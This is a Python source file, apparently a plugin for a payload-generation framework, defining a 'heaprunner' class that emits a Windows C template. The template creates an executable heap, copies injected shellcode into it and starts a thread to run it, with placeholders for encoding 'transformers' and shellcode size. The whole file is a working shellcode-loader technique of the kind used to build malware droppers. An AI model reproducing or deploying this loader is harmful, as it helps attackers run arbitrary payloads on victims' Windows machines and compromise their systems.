from string import Template

class heaprunner:
    def __init__(self, arguments):
        pass

    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>", 
                "#include <stdlib.h>"]

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return """"""

    def template(self) -> str:
        return """
    {transformers}
    // Allocate a region of RWX memory for shellcode

    HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, {shellcodeSize}, 0);
    
    LPVOID buffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, {shellcodeSize});

    // Copy our shellcode into memory that we just allocated (inside of our current process)
    memcpy(buffer, shellcode, {shellcodeSize});

    // Create thread to run shellcode
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);

    // Wait for thread to finish
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    // Clean up by freeing the memory we allocated for our shellcode
    HeapDestroy(hHeap);

    return 0;
"""